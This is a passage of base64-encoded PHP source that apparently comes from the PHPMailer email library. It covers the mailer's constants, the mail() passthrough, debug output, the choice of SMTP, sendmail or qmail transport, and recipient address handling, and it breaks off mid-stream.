2U7CgogICAgLyoqCiAgICAgKiBVbmlxdWUgSUQgdXNlZCBmb3IgbWVzc2FnZSBJRCBhbmQgYm91bmRhcmllcy4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJHVuaXF1ZWlkID0gJyc7CgogICAgLyoqCiAgICAgKiBFcnJvciBzZXZlcml0eTogbWVzc2FnZSBvbmx5LCBjb250aW51ZSBwcm9jZXNzaW5nLgogICAgICovCiAgICBjb25zdCBTVE9QX01FU1NBR0UgPSAwOwoKICAgIC8qKgogICAgICogRXJyb3Igc2V2ZXJpdHk6IG1lc3NhZ2UsIGxpa2VseSBvayB0byBjb250aW51ZSBwcm9jZXNzaW5nLgogICAgICovCiAgICBjb25zdCBTVE9QX0NPTlRJTlVFID0gMTsKCiAgICAvKioKICAgICAqIEVycm9yIHNldmVyaXR5OiBtZXNzYWdlLCBwbHVzIGZ1bGwgc3RvcCwgY3JpdGljYWwgZXJyb3IgcmVhY2hlZC4KICAgICAqLwogICAgY29uc3QgU1RPUF9DUklUSUNBTCA9IDI7CgogICAgLyoqCiAgICAgKiBTTVRQIFJGQyBzdGFuZGFyZCBsaW5lIGVuZGluZy4KICAgICAqLwogICAgY29uc3QgQ1JMRiA9ICJcclxuIjsKCiAgICAvKioKICAgICAqIFRoZSBtYXhpbXVtIGxpbmUgbGVuZ3RoIGFsbG93ZWQgYnkgUkZDIDI4MjIgc2VjdGlvbiAyLjEuMQogICAgICogQHZhciBpbnRlZ2VyCiAgICAgKi8KICAgIGNvbnN0IE1BWF9MSU5FX0xFTkdUSCA9IDk5ODsKCiAgICAvKioKICAgICAqIENvbnN0cnVjdG9yLgogICAgICogQHBhcmFtIGJvb2xlYW4gJGV4Y2VwdGlvbnMgU2hvdWxkIHdlIHRocm93IGV4dGVybmFsIGV4Y2VwdGlvbnM/CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkZXhjZXB0aW9ucyA9IG51bGwpCiAgICB7CiAgICAgICAgaWYgKCRleGNlcHRpb25zICE9PSBudWxsKSB7CiAgICAgICAgICAgICR0aGlzLT5leGNlcHRpb25zID0gKGJvb2xlYW4pJGV4Y2VwdGlvbnM7CiAgICAgICAgfQogICAgICAgIC8vUGljayBhbiBhcHByb3ByaWF0ZSBkZWJ1ZyBvdXRwdXQgZm9ybWF0IGF1dG9tYXRpY2FsbHkKICAgICAgICAkdGhpcy0+RGVidWdvdXRwdXQgPSAoc3RycG9zKFBIUF9TQVBJLCAnY2xpJykgIT09IGZhbHNlID8gJ2VjaG8nIDogJ2h0bWwnKTsKICAgIH0KCiAgICAvKioKICAgICAqIERlc3RydWN0b3IuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2Rlc3RydWN0KCkKICAgIHsKICAgICAgICAvL0Nsb3NlIGFueSBvcGVuIFNNVFAgY29ubmVjdGlvbiBuaWNlbHkKICAgICAgICAkdGhpcy0+c210cENsb3NlKCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDYWxsIG1haWwoKSBpbiBhIHNhZmVfbW9kZS1hd2FyZSBmYXNoaW9uLgogICAgICogQWxzbywgdW5sZXNzIHNlbmRtYWlsX3BhdGggcG9pbnRzIHRvIHNlbmRtYWlsIChvciBzb21ldGhpbmcgdGhhdAogICAgICogY2xhaW1zIHRvIGJlIHNlbmRtYWlsKSwgZG9uJ3QgcGFzcyBwYXJhbXMgKG5vdCBhIHBlcmZlY3QgZml4LAogICAgICogYnV0IGl0IHdpbGwgZG8pCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0byBUbwogICAgICogQHBhcmFtIHN0cmluZyAkc3ViamVjdCBTdWJqZWN0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IE1lc3NhZ2UgQm9keQogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyIEFkZGl0aW9uYWwgSGVhZGVyKHMpCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXJhbXMgUGFyYW1zCiAgICAgKiBAYWNjZXNzIHByaXZhdGUKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwcml2YXRlIGZ1bmN0aW9uIG1haWxQYXNzdGhydSgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcykKICAgIHsKICAgICAgICAvL0NoZWNrIG92ZXJsb2FkaW5nIG9mIG1haWwgZnVuY3Rpb24gdG8gYXZvaWQgZG91YmxlLWVuY29kaW5nCiAgICAgICAgaWYgKGluaV9nZXQoJ21ic3RyaW5nLmZ1bmNfb3ZlcmxvYWQnKSAmIDEpIHsKICAgICAgICAgICAgJHN1YmplY3QgPSAkdGhpcy0+c2VjdXJlSGVhZGVyKCRzdWJqZWN0KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc3ViamVjdCA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkc3ViamVjdCkpOwogICAgICAgIH0KCiAgICAgICAgLy9DYW4ndCB1c2UgYWRkaXRpb25hbF9wYXJhbWV0ZXJzIGluIHNhZmVfbW9kZSwgY2FsbGluZyBtYWlsKCkgd2l0aCBudWxsIHBhcmFtcyBicmVha3MKICAgICAgICAvL0BsaW5rIGh0dHA6Ly9waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5tYWlsLnBocAogICAgICAgIGlmIChpbmlfZ2V0KCdzYWZlX21vZGUnKSBvciAhJHRoaXMtPlVzZVNlbmRtYWlsT3B0aW9ucyBvciBpc19udWxsKCRwYXJhbXMpKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSBAbWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlcik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHJlc3VsdCA9IEBtYWlsKCR0bywgJHN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9CiAgICAvKioKICAgICAqIE91dHB1dCBkZWJ1Z2dpbmcgaW5mbyB2aWEgdXNlci1kZWZpbmVkIG1ldGhvZC4KICAgICAqIE9ubHkgZ2VuZXJhdGVzIG91dHB1dCBpZiBTTVRQIGRlYnVnIG91dHB1dCBpcyBlbmFibGVkIChAc2VlIFNNVFA6OiRkb19kZWJ1ZykuCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JERlYnVnb3V0cHV0CiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JFNNVFBEZWJ1ZwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlZGVidWcoJHN0cikKICAgIHsKICAgICAgICBpZiAoJHRoaXMtPlNNVFBEZWJ1ZyA8PSAwKSB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgLy9Bdm9pZCBjbGFzaCB3aXRoIGJ1aWx0LWluIGZ1bmN0aW9uIG5hbWVzCiAgICAgICAgaWYgKCFpbl9hcnJheSgkdGhpcy0+RGVidWdvdXRwdXQsIGFycmF5KCdlcnJvcl9sb2cnLCAnaHRtbCcsICdlY2hvJykpIGFuZCBpc19jYWxsYWJsZSgkdGhpcy0+RGVidWdvdXRwdXQpKSB7CiAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jKCR0aGlzLT5EZWJ1Z291dHB1dCwgJHN0ciwgJHRoaXMtPlNNVFBEZWJ1Zyk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgc3dpdGNoICgkdGhpcy0+RGVidWdvdXRwdXQpIHsKICAgICAgICAgICAgY2FzZSAnZXJyb3JfbG9nJzoKICAgICAgICAgICAgICAgIC8vRG9uJ3Qgb3V0cHV0LCBqdXN0IGxvZwogICAgICAgICAgICAgICAgZXJyb3JfbG9nKCRzdHIpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2h0bWwnOgogICAgICAgICAgICAgICAgLy9DbGVhbnMgdXAgb3V0cHV0IGEgYml0IGZvciBhIGJldHRlciBsb29raW5nLCBIVE1MLXNhZmUgb3V0cHV0CiAgICAgICAgICAgICAgICBlY2hvIGh0bWxlbnRpdGllcygKICAgICAgICAgICAgICAgICAgICBwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkc3RyKSwKICAgICAgICAgICAgICAgICAgICBFTlRfUVVPVEVTLAogICAgICAgICAgICAgICAgICAgICdVVEYtOCcKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIC4gIjxicj5cbiI7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnZWNobyc6CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAvL05vcm1hbGl6ZSBsaW5lIGJyZWFrcwogICAgICAgICAgICAgICAgJHN0ciA9IHByZWdfcmVwbGFjZSgnL1xyXG4/L21zJywgIlxuIiwgJHN0cik7CiAgICAgICAgICAgICAgICBlY2hvIGdtZGF0ZSgnWS1tLWQgSDppOnMnKSAuICJcdCIgLiBzdHJfcmVwbGFjZSgKICAgICAgICAgICAgICAgICAgICAiXG4iLAogICAgICAgICAgICAgICAgICAgICJcbiAgICAgICAgICAgICAgICAgICBcdCAgICAgICAgICAgICAgICAgICIsCiAgICAgICAgICAgICAgICAgICAgdHJpbSgkc3RyKQogICAgICAgICAgICAgICAgKSAuICJcbiI7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyBTTVRQLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1NNVFAoKQogICAgewogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnc210cCc7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1lc3NhZ2VzIHVzaW5nIFBIUCdzIG1haWwoKSBmdW5jdGlvbi4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNNYWlsKCkKICAgIHsKICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ21haWwnOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyAkU2VuZG1haWwuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzU2VuZG1haWwoKQogICAgewogICAgICAgICRpbmlfc2VuZG1haWxfcGF0aCA9IGluaV9nZXQoJ3NlbmRtYWlsX3BhdGgnKTsKCiAgICAgICAgaWYgKCFzdHJpc3RyKCRpbmlfc2VuZG1haWxfcGF0aCwgJ3NlbmRtYWlsJykpIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJy91c3Ivc2Jpbi9zZW5kbWFpbCc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJGluaV9zZW5kbWFpbF9wYXRoOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3NlbmRtYWlsJzsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgcW1haWwuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzUW1haWwoKQogICAgewogICAgICAgICRpbmlfc2VuZG1haWxfcGF0aCA9IGluaV9nZXQoJ3NlbmRtYWlsX3BhdGgnKTsKCiAgICAgICAgaWYgKCFzdHJpc3RyKCRpbmlfc2VuZG1haWxfcGF0aCwgJ3FtYWlsJykpIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJy92YXIvcW1haWwvYmluL3FtYWlsLWluamVjdCc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJGluaV9zZW5kbWFpbF9wYXRoOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3FtYWlsJzsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhICJUbyIgYWRkcmVzcy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQWRkcmVzcygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygndG8nLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgIkNDIiBhZGRyZXNzLgogICAgICogQG5vdGU6IFRoaXMgZnVuY3Rpb24gd29ya3Mgd2l0aCB0aGUgU01UUCBtYWlsZXIgb24gd2luMzIsIG5vdCB3aXRoIHRoZSAibWFpbCIgbWFpbGVyLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBzZW5kIHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRDQygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnY2MnLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgIkJDQyIgYWRkcmVzcy4KICAgICAqIEBub3RlOiBUaGlzIGZ1bmN0aW9uIHdvcmtzIHdpdGggdGhlIFNNVFAgbWFpbGVyIG9uIHdpbjMyLCBub3Qgd2l0aCB0aGUgIm1haWwiIG1haWxlci4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQkNDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdiY2MnLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgIlJlcGx5LVRvIiBhZGRyZXNzLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byByZXBseSB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkUmVwbHlUbygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnUmVwbHktVG8nLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGFuIGFkZHJlc3MgdG8gb25lIG9mIHRoZSByZWNpcGllbnQgYXJyYXlzIG9yIHRvIHRoZSBSZXBseVRvIGFycmF5LiBCZWNhdXNlIFBIUE1haWxlcgogICAgICogY2FuJ3QgdmFsaWRhdGUgYWRkcmVzc2VzIHdpdGggYW4gSUROIHdpdGhvdXQga25vd2luZyB0aGUgUEhQTWFpbGVyOjokQ2hhclNldCAodGhhdCBjYW4gc3RpbGwKICAgICAqIGJlIG1vZGlmaWVkIGFmdGVyIGNhbGxpbmcgdGhpcyBmdW5jdGlvbiksIGFkZGl0aW9uIG9mIHN1Y2ggYWRkcmVzc2VzIGlzIGRlbGF5ZWQgdW50aWwgc2VuZCgpLgogICAgICogQWRkcmVzc2VzIHRoYXQgaGF2ZSBiZWVuIGFkZGVkIGFscmVhZHkgcmV0dXJuIGZhbHNlLCBidXQgZG8gbm90IHRocm93IGV4Y2VwdGlvbnMuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRraW5kIE9uZSBvZiAndG8nLCAnY2MnLCAnYmNjJywgb3IgJ1JlcGx5VG8nCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQsIHJlc3AuIHRvIHJlcGx5IHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGFkZE9yRW5xdWV1ZUFuQWRkcmVzcygka2luZCwgJGFkZHJlc3MsICRuYW1lKQogICAgewogICAgICAgICRhZGRyZXNzID0gdHJpbSgkYWRkcmVzcyk7CiAgICAgICAgJG5hbWUgPSB0cmltKHByZWdfcmVwbGFjZSgnL1tcclxuXSsvJywgJycsICRuYW1lKSk7IC8vU3RyaXAgYnJlYWtzIGFuZCB0cmltCiAgICAgICAgaWYgKCgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgPT09IGZhbHNlKSB7CiAgICAgICAgICAgIC8vIEF0LXNpZ24gaXMgbWlzc3NpbmcuCiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gIiAoYWRkQW5BZGRyZXNzICRraW5kKTogJGFkZHJlc3MiOwogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgICRwYXJhbXMgPSBhcnJheSgka2luZCwgJGFkZHJlc3MsICRuYW1lKTsKICAgICAgICAvLyBFbnF1ZXVlIGFkZHJlc3NlcyB3aXRoIElETiB1bnRpbCB3ZSBrbm93IHRoZSBQSFBNYWlsZXI6OiRDaGFyU2V0LgogICAgICAgIGlmICgkdGhpcy0+aGFzOGJpdENoYXJzKHN1YnN0cigkYWRkcmVzcywgKyskcG9zKSkgYW5kICR0aGlzLT5pZG5TdXBwb3J0ZWQoKSkgewogICAgICAgICAgICBpZiAoJGtpbmQgIT0gJ1JlcGx5LVRvJykgewogICAgICAgICAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCRhZGRyZXNzLCAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlKSkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5SZWNpcGllbnRzUXVldWVbJGFkZHJlc3NdID0gJHBhcmFtczsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkYWRkcmVzcywgJHRoaXMtPlJlcGx5VG9RdWV1ZSkpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+UmVwbHlUb1F1ZXVlWyRhZGRyZXNzXSA9ICRwYXJhbXM7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAvLyBJbW1lZGlhdGVseSBhZGQgc3RhbmRhcmQgYWRkcmVzc2VzIHdpdGhvdXQgSUROLgogICAgICAgIHJldHVybiBjYWxsX3VzZXJfZnVuY19hcnJheShhcnJheSgkdGhpcywgJ2FkZEFuQWRkcmVzcycpLCAkcGFyYW1zKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBhZGRyZXNzIHRvIG9uZSBvZiB0aGUgcmVjaXBpZW50IGFycmF5cyBvciB0byB0aGUgUmVwbHlUbyBhcnJheS4KICAgICAqIEFkZHJlc3NlcyB0aGF0IGhhdmUgYmVlbiBhZGRlZCBhbHJlYWR5IHJldHVybiBmYWxzZSwgYnV0IGRvIG5vdCB0aHJvdyBleGNlcHRpb25zLgogICAgICogQHBhcmFtIHN0cmluZyAka2luZCBPbmUgb2YgJ3RvJywgJ2NjJywgJ2JjYycsIG9yICdSZXBseVRvJwogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBzZW5kLCByZXNwLiB0byByZXBseSB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbiB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhZGRBbkFkZHJlc3MoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIGlmICghaW5fYXJyYXkoJGtpbmQsIGFycmF5KCd0bycsICdjYycsICdiY2MnLCAnUmVwbHktVG8nKSkpIHsKICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnSW52YWxpZCByZWNpcGllbnQga2luZDogJykgLiAka2luZDsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7CiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gIiAoYWRkQW5BZGRyZXNzICRraW5kKTogJGFkZHJlc3MiOwogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGlmICgka2luZCAhPSAnUmVwbHktVG8nKSB7CiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPmFsbF9yZWNpcGllbnRzKSkgewogICAgICAgICAgICAgICAgYXJyYXlfcHVzaCgkdGhpcy0+JGtpbmQsIGFycmF5KCRhZGRyZXNzLCAkbmFtZSkpOwogICAgICAgICAgICAgICAgJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGFkZHJlc3MpXSA9IHRydWU7CiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPlJlcGx5VG8pKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+UmVwbHlUb1tzdHJ0b2xvd2VyKCRhZGRyZXNzKV0gPSBhcnJheSgkYWRkcmVzcywgJG5hbWUpOwogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogUGFyc2UgYW5kIHZhbGlkYXRlIGEgc3RyaW5nIGNvbnRhaW5pbmcgb25lIG9yIG1vcmUgUkZDODIyLXN0eWxlIGNvbW1hLXNlcGFyYXRlZCBlbWFpbCBhZGRyZXNzZXMKICAgICAqIG9mIHRoZSBmb3JtICJkaXNwbGF5IG5hbWUgPGFkZHJlc3M+IiBpbnRvIGFuIGFycmF5IG9mIG5hbWUvYWRkcmVzcyBwYWlycy4KICAgICAqIFVzZXMgdGhlIGltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QgZnVuY3Rpb24gaWYgdGhlIElNQVAgZXh0ZW5zaW9uIGlzIGF2YWlsYWJsZS4KICAgICAqIE5vdGUgdGhhdCBxdW90ZXMgaW4gdGhlIG5hbWUgcGFydCBhcmUgcmVtb3ZlZC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJzdHIgVGhlIGFkZHJlc3MgbGlzdCBzdHJpbmcKICAgICAqIEBwYXJhbSBib29sICR1c2VpbWFwIFdoZXRoZXIgdG8gdXNlIHRoZSBJTUFQIGV4dGVuc2lvbiB0byBwYXJzZSB0aGUgbGlzdAogICAgICogQHJldHVybiBhcnJheQogICAgICogQGxpbmsgaHR0cDovL3d3dy5hbmRyZXcuY211LmVkdS91c2VyL2FncmVlbjEvdGVzdGluZy9tcmJzL3dlYi9NYWlsL1JGQzgyMi5waHAgQSBtb3JlIGNhcmVmdWwgaW1wbGVtZW50YXRpb24KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHBhcnNlQWRkcmVzc2VzKCRhZGRyc3RyLCAkdXNlaW1hcCA9IHRydWUpCiAgICB7CiAgICAgICAgJGFkZHJlc3NlcyA9IGFycmF5KCk7CiAgICAgICAgaWYgKCR1c2VpbWFwIGFuZCBmdW5jdGlvbl9leGlzdHMoJ2ltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QnKSkgewogICAgICAgICAgICAvL1VzZSB0aGlzIGJ1aWx0LWluIHBhcnNlciBpZiBpdCdzIGF2YWlsYWJsZQogICAgICAgICAgICAkbGlzdCA9IGltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QoJGFkZHJzdHIsICcnKTsKICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgICAgIGlmICgkYWRkcmVzcy0+aG9zdCAhPSAnLlNZTlRBWC1FUlJPUi4nKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gKHByb3BlcnR5X2V4aXN0cygkYWRkcmVzcywgJ3BlcnNvbmFsJykgPyAkYWRkcmVzcy0+cGVyc29uYWwgOiAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWRkcmVzcycgPT4gJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdAogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vVXNlIHRoaXMgc2ltcGxlciBwYXJzZXIKICAgICAgICAgICAgJGxpc3QgPSBleHBsb2RlKCcsJywgJGFkZHJzdHIpOwogICAgICAgI